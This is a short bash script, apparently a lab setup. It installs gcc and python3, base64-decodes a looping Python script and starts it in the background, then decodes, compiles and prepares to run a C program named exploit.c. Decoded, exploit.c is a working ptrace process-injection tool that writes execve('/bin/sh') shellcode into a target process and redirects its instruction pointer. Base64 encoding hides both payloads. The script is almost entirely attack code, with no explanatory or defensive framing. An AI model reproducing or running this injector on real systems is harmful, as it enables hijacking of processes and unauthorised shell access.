#!/bin/bash
apt-get update
apt-get install gcc -y
apt-get install python3 -y
echo "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppID0gMAp3aGlsZSBUcnVlOgogIGkgKz0gMQ==" | base64 -d > process.py
nohup python3 process.py &
echo "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CgoKI2luY2x1ZGUgPHN5cy9wdHJhY2UuaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3dhaXQuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKI2luY2x1ZGUgPHN5cy91c2VyLmg+CiNpbmNsdWRlIDxzeXMvcmVnLmg+CgojZGVmaW5lIFNIRUxMQ09ERV9TSVpFIDMyCgp1bnNpZ25lZCBjaGFyICpzaGVsbGNvZGUgPSAKICAiXHg0OFx4MzFceGMwXHg0OFx4ODlceGMyXHg0OFx4ODkiCiAgIlx4YzZceDQ4XHg4ZFx4M2RceDA0XHgwMFx4MDBceDAwIgogICJceDA0XHgzYlx4MGZceDA1XHgyZlx4NjJceDY5XHg2ZSIKICAiXHgyZlx4NzNceDY4XHgwMFx4Y2NceDkwXHg5MFx4OTAiOwoKCmludAppbmplY3RfZGF0YSAocGlkX3QgcGlkLCB1bnNpZ25lZCBjaGFyICpzcmMsIHZvaWQgKmRzdCwgaW50IGxlbikKewogIGludCAgICAgIGk7CiAgdWludDMyX3QgKnMgPSAodWludDMyX3QgKikgc3JjOwogIHVpbnQzMl90ICpkID0gKHVpbnQzMl90ICopIGRzdDsKCiAgZm9yIChpID0gMDsgaSA8IGxlbjsgaSs9NCwgcysrLCBkKyspCiAgICB7CiAgICAgIGlmICgocHRyYWNlIChQVFJBQ0VfUE9LRVRFWFQsIHBpZCwgZCwgKnMpKSA8IDApCgl7CgkgIHBlcnJvciAoInB0cmFjZShQT0tFVEVYVCk6Iik7CgkgIHJldHVybiAtMTsKCX0KICAgIH0KICByZXR1cm4gMDsKfQoKaW50Cm1haW4gKGludCBhcmdjLCBjaGFyICphcmd2W10pCnsKICBwaWRfdCAgICAgICAgICAgICAgICAgICB0YXJnZXQ7CiAgc3RydWN0IHVzZXJfcmVnc19zdHJ1Y3QgcmVnczsKICBpbnQgICAgICAgICAgICAgICAgICAgICBzeXNjYWxsOwogIGxvbmcgICAgICAgICAgICAgICAgICAgIGRzdDsKCiAgaWYgKGFyZ2MgIT0gMikKICAgIHsKICAgICAgZnByaW50ZiAoc3RkZXJyLCAiVXNhZ2U6XG5cdCVzIHBpZFxuIiwgYXJndlswXSk7CiAgICAgIGV4aXQgKDEpOwogICAgfQogIHRhcmdldCA9IGF0b2kgKGFyZ3ZbMV0pOwogIHByaW50ZiAoIisgVHJhY2luZyBwcm9jZXNzICVkXG4iLCB0YXJnZXQpOwoKICBpZiAoKHB0cmFjZSAoUFRSQUNFX0FUVEFDSCwgdGFyZ2V0LCBOVUxMLCBOVUxMKSkgPCAwKQogICAgewogICAgICBwZXJyb3IgKCJwdHJhY2UoQVRUQUNIKToiKTsKICAgICAgZXhpdCAoMSk7CiAgICB9CgogIHByaW50ZiAoIisgV2FpdGluZyBmb3IgcHJvY2Vzcy4uLlxuIik7CiAgd2FpdCAoTlVMTCk7CgogIHByaW50ZiAoIisgR2V0dGluZyBSZWdpc3RlcnNcbiIpOwogIGlmICgocHRyYWNlIChQVFJBQ0VfR0VUUkVHUywgdGFyZ2V0LCBOVUxMLCAmcmVncykpIDwgMCkKICAgIHsKICAgICAgcGVycm9yICgicHRyYWNlKEdFVFJFR1MpOiIpOwogICAgICBleGl0ICgxKTsKICAgIH0KICAKCiAgLyogSW5qZWN0IGNvZGUgaW50byBjdXJyZW50IFJQSSBwb3NpdGlvbiAqLwoKICBwcmludGYgKCIrIEluamVjdGluZyBzaGVsbCBjb2RlIGF0ICVwXG4iLCAodm9pZCopcmVncy5yaXApOwogIGluamVjdF9kYXRhICh0YXJnZXQsIHNoZWxsY29kZSwgKHZvaWQqKXJlZ3MucmlwLCBTSEVMTENPREVfU0laRSk7CgogIHJlZ3MucmlwICs9IDI7CiAgcHJpbnRmICgiKyBTZXR0aW5nIGluc3RydWN0aW9uIHBvaW50ZXIgdG8gJXBcbiIsICh2b2lkKilyZWdzLnJpcCk7CgogIGlmICgocHRyYWNlIChQVFJBQ0VfU0VUUkVHUywgdGFyZ2V0LCBOVUxMLCAmcmVncykpIDwgMCkKICAgIHsKICAgICAgcGVycm9yICgicHRyYWNlKEdFVFJFR1MpOiIpOwogICAgICBleGl0ICgxKTsKICAgIH0KICBwcmludGYgKCIrIFJ1biBpdCFcbiIpOwoKIAogIGlmICgocHRyYWNlIChQVFJBQ0VfREVUQUNILCB0YXJnZXQsIE5VTEwsIE5VTEwpKSA8IDApCgl7CgkgIHBlcnJvciAoInB0cmFjZShERVRBQ0gpOiIpOwoJICBleGl0ICgxKTsKCX0KICByZXR1cm4gMDsKCn0=" | base64 -d > exploit.c
gcc exploit.c -o exploit
chmod +x exploit
var=$(pidof python3 process.py)
echo "./exploit $var"